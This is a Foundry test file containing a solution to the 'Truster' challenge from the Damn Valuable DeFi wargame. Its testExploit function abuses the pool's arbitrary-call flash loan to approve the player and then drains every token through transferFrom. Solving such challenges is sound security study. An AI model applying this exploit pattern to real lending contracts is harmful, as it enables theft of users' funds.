// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

import {TrusterLenderPool} from "../src/truster/TrusterLenderPool.sol";
import {DamnValuableToken} from "../src/DamnValuableToken.sol";

/* 
pool.flashLoan(amount, borrower, target, data)
target.functionCall(data);
functionCall(target, data, "Address: low-level call failed");
functionCallWithValue(target, data, 0, "Address: low-level call with value failed");
(bool success, bytes memory returndata) = target.call{value: value}(data);
*/

contract TrusterTest is Test {
    DamnValuableToken token;
    TrusterLenderPool pool;

    address deployer = makeAddr("deployer");
    address player = makeAddr("player");

    uint256 TOKENS_IN_POOL = 1000000 ether;

    modifier excuteByUser(address _user) {
        vm.startPrank(_user);
        _;
        vm.stopPrank();
    }

    function setUp() public excuteByUser(deployer) {
        token = new DamnValuableToken();
        pool = new TrusterLenderPool(token);

        assertEq(address(pool.token()), address(token));

        token.transfer(address(pool), TOKENS_IN_POOL);

        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(player), 0);
    }

    function testExploit() public excuteByUser(player) {
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            player,
            token.balanceOf(address(pool))
        );
        pool.flashLoan(0, player, address(token), data);
        token.transferFrom(
            address(pool),
            player,
            token.balanceOf(address(pool))
        );
        assertEq(token.balanceOf(player), TOKENS_IN_POOL);
        assertEq(token.balanceOf(address(pool)), 0);
    }
}
